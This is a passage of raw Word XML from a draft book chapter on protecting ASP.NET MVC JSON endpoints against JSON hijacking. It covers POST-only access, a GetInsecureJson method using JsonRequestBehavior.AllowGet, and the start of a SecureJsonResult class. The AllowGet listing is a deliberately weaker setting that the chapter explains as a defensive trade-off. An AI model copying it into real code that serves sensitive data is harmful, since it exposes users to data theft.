    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t xml:space="preserve"> &lt;h2&gt;Secure Json (Post)&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t xml:space="preserve">  &lt;div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t xml:space="preserve">    &lt;select id="securepost"/&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r w:rsidR="003C6B7A">
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
      <w:r>
        <w:t>#3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t xml:space="preserve"> &lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 A helper function for JSON</w:t>
      </w:r>
      <w:ins w:id="400" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="401" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="402" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> POST</w:t>
      </w:r>
      <w:ins w:id="403" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="404" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>POST</w:instrText>
      </w:r>
      <w:ins w:id="405" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:commentRangeEnd w:id="398"/>
    <w:p w:rsidR="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:commentReference w:id="398"/>
      </w:r>
      <w:commentRangeEnd w:id="399"/>
      <w:r w:rsidR="001C06F0">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:commentReference w:id="399"/>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t>#2 Our script populates select  options</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#3 The target select element</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.12 uses the jQuery JavaScript</w:t>
      </w:r>
      <w:ins w:id="406" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00630D9B">
        <w:rPr>
          <w:rPrChange w:id="407" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JavaScript</w:instrText>
      </w:r>
      <w:ins w:id="408" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> library to craft a special POST</w:t>
      </w:r>
      <w:ins w:id="409" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="410" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>POST</w:instrText>
      </w:r>
      <w:ins w:id="411" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> request for our JSON</w:t>
      </w:r>
      <w:ins w:id="412" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="413" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="414" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> data </w:t>
      </w:r>
      <w:r w:rsidRPr="009439E4">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
        </w:rPr>
        <w:t>(1)</w:t>
      </w:r>
      <w:r>
        <w:t>.  When the results are returned</w:t>
      </w:r>
      <w:r w:rsidR="00FA5745">
        <w:t xml:space="preserve">, the function </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
        </w:rPr>
        <w:t>(2)</w:t>
      </w:r>
      <w:r w:rsidR="00FA5745">
        <w:t xml:space="preserve"> populates the select list with them.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:lastRenderedPageBreak/>
        <w:t>11.3.3.2 Override defaults for GET</w:t>
      </w:r>
      <w:ins w:id="415" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="416" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>GET</w:instrText>
      </w:r>
      <w:ins w:id="417" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00FA5745">
        <w:t xml:space="preserve"> access</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>The problem with this approach is not necessarily technical - it works and it prevents JSON</w:t>
      </w:r>
      <w:ins w:id="418" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="419" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="420" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> hijacking</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="005828C7">
        <w:instrText>JSON hijacking</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  But it's a workaround that is sometimes </w:t>
      </w:r>
      <w:r w:rsidR="00D963F0">
        <w:t>unnecessary</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and can interfere with systems developed using the REST architectural style.  In those circumstances we have additional options.  First, we can explicitly enable JSON requests from GETs </w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t>by code shown in listing 11.13.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.13 Directing JsonResult</w:t>
      </w:r>
      <w:ins w:id="421" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="422" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JsonResult</w:instrText>
      </w:r>
      <w:ins w:id="423" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> to accept GETs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t>[HttpGet]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t>public JsonResult</w:t>
      </w:r>
      <w:ins w:id="424" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="425" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JsonResult</w:instrText>
      </w:r>
      <w:ins w:id="426" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="009439E4">
        <w:t xml:space="preserve"> GetInsecureJson()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:tab/>
        <w:t>object data = GetData();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:tab/>
        <w:t>return Json(data, JsonRequestBehavior</w:t>
      </w:r>
      <w:ins w:id="427" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="000F10E3">
        <w:rPr>
          <w:rPrChange w:id="428" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JsonRequestBehavior</w:instrText>
      </w:r>
      <w:ins w:id="429" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="009439E4">
        <w:t>.AllowGet);</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1: Directing JsonResult</w:t>
      </w:r>
      <w:ins w:id="430" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="431" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JsonResult</w:instrText>
      </w:r>
      <w:ins w:id="432" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> to allow GETs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>This will allow our action to respond to normal JSON</w:t>
      </w:r>
      <w:ins w:id="433" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="434" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="435" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> GET</w:t>
      </w:r>
      <w:ins w:id="436" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="437" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>GET</w:instrText>
      </w:r>
      <w:ins w:id="438" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> requests.  Finally, we can scrap </w:t>
      </w:r>
      <w:r w:rsidR="00705E20" w:rsidRPr="00705E20">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>JsonResult</w:t>
      </w:r>
      <w:ins w:id="439" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="440" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JsonResult</w:instrText>
      </w:r>
      <w:ins w:id="441" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> itself, instead using an action result to return only non-vulnerable</w:t>
      </w:r>
      <w:ins w:id="442" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="443" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="444" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve">, non-array formatted, JSON. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.3.3.3 </w:t>
      </w:r>
      <w:r w:rsidR="00D32D97">
        <w:t>Modifying</w:t>
      </w:r>
      <w:r w:rsidR="00FA5745">
        <w:t xml:space="preserve"> the</w:t>
      </w:r>
      <w:r w:rsidR="00D32D97">
        <w:t xml:space="preserve"> JSON</w:t>
      </w:r>
      <w:ins w:id="445" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="446" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="447" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00D32D97">
        <w:t xml:space="preserve"> response</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>The code in listing 11.14 shows a special action result that wraps vulnerable</w:t>
      </w:r>
      <w:ins w:id="448" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="449" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="450" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> JSON</w:t>
      </w:r>
      <w:ins w:id="451" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="452" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="453" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> data in a variable "d".</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Listing 11.14 </w:t>
      </w:r>
      <w:r w:rsidR="00F911AC">
        <w:t xml:space="preserve">Creating  a </w:t>
      </w:r>
      <w:r>
        <w:t>SecureJsonResult</w:t>
      </w:r>
      <w:r w:rsidR="00F911AC">
        <w:t xml:space="preserve"> action result encapsulates the tricky JSON</w:t>
      </w:r>
      <w:ins w:id="454" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="455" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="456" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00F911AC">
        <w:t xml:space="preserve"> serialization logic.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:t>public class SecureJsonResult : ActionResult</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
